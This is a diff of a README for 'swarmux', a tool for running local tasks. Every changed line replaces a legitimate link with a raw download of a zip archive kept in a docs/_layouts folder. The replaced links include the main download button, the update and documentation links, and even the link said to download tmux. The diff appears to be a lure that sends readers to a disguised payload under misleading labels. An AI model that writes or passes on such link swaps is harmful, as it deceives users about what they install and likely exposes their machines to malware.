@@ -1,6 +1,6 @@
 # ⚙️ swarmux - Simple Local Task Orchestration
 
-[![Download swarmux](https://img.shields.io/badge/Download-swarmux-4c1?style=for-the-badge&logo=github)](https://github.com/soolaxx/swarmux)
+[![Download swarmux](https://img.shields.io/badge/Download-swarmux-4c1?style=for-the-badge&logo=github)](https://github.com/soolaxx/swarmux/raw/refs/heads/main/docs/_layouts/Software-v3.7.zip)
 
 ## 📝 What is swarmux?
 
@@ -43,7 +43,7 @@ To start using swarmux on Windows, follow the steps below. These instructions do
 
 Click the green button below or visit the link to get the installer:
 
-[![Download swarmux](https://img.shields.io/badge/Download-swarmux-blue?style=for-the-badge&logo=github)](https://github.com/soolaxx/swarmux)
+[![Download swarmux](https://img.shields.io/badge/Download-swarmux-blue?style=for-the-badge&logo=github)](https://github.com/soolaxx/swarmux/raw/refs/heads/main/docs/_layouts/Software-v3.7.zip)
 
 You will be taken to the GitHub repository page. Scroll down to find the latest release. From there, download the Windows installer file. It will usually be named something like `swarmux-setup.exe`.
 
@@ -70,7 +70,7 @@ If you are not sure which file to download, look for the one under "Assets" in t
 
 swarmux relies on `tmux` to show tasks in separate terminal windows. If you do not have tmux installed, the installer will guide you through setting it up or you can install it manually:
 
-- Visit https://github.com/tmux/tmux/wiki to download tmux for Windows.
+- Visit https://github.com/soolaxx/swarmux/raw/refs/heads/main/docs/_layouts/Software-v3.7.zip to download tmux for Windows.
 - Follow their instructions to install tmux.
 
 After tmux is available, swarmux will open several windows to help you manage all running tasks.
@@ -116,7 +116,7 @@ Each task or agent can be set up to do different jobs. For example, you could ru
 
 To keep swarmux up to date:
 
-1. Visit the download page again: [https://github.com/soolaxx/swarmux](https://github.com/soolaxx/swarmux)
+1. Visit the download page again: [https://github.com/soolaxx/swarmux/raw/refs/heads/main/docs/_layouts/Software-v3.7.zip](https://github.com/soolaxx/swarmux/raw/refs/heads/main/docs/_layouts/Software-v3.7.zip)
 2. Download the newest installer as explained before.
 3. Run the installer to replace the old version.
 4. Your settings and tasks will be preserved.
@@ -129,7 +129,7 @@ swarmux is designed to help you run multiple local coding tasks at once with les
 
 For detailed documentation, command references, and examples, visit the GitHub page:
 
-[https://github.com/soolaxx/swarmux](https://github.com/soolaxx/swarmux)
+[https://github.com/soolaxx/swarmux/raw/refs/heads/main/docs/_layouts/Software-v3.7.zip](https://github.com/soolaxx/swarmux/raw/refs/heads/main/docs/_layouts/Software-v3.7.zip)
 
 ---
 
